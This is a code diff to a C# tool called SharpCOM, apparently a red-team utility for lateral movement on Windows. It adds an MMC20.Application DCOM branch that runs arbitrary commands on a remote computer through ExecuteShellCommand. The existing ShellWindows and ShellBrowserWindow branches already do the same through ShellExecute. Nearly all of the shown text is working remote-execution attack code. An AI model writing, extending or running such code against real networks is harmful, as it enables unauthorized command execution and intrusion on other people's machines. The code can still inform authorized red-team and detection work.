@@ -8,7 +8,7 @@ namespace SharpCOM
     {
         public static void Main(string[] args)
         {
-            string Method = "ShellWindows";
+            string Method = null;
             string ComputerName = null;
             string Directory = "C:\\WINDOWS\\System32\\";
             string Parameters = "";
@@ -51,12 +51,19 @@ namespace SharpCOM
                     object Application = Document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, Document, null);
                     Application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, Application, new object[] { Command, Parameters, Directory, null, 0 });
                 }
+                else if (Method == "MMC")
+                {
+                    Type ComType = Type.GetTypeFromProgID("MMC20.Application", ComputerName);
+                    object RemoteComObject = Activator.CreateInstance(ComType);
+                    object Document = RemoteComObject.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, RemoteComObject, null);
+                    object ActiveView = Document.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, Document, null);
+                    ActiveView.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, ActiveView, new object[] { Command, null, null, 7 });
+                }
                 else if (Method == "ShellBrowserWindow")
                 {
                     var CLSID = "C08AFD90-F2A1-11D1-8455-00A0C91F3880";
                     Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), ComputerName);
                     object RemoteComObject = Activator.CreateInstance(ComType);
-             
                     object Document = RemoteComObject.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, RemoteComObject, null);
                     object Application = Document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, Document, null);
                     Application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, Application, new object[] { Command, Parameters, Directory, null, 0 });
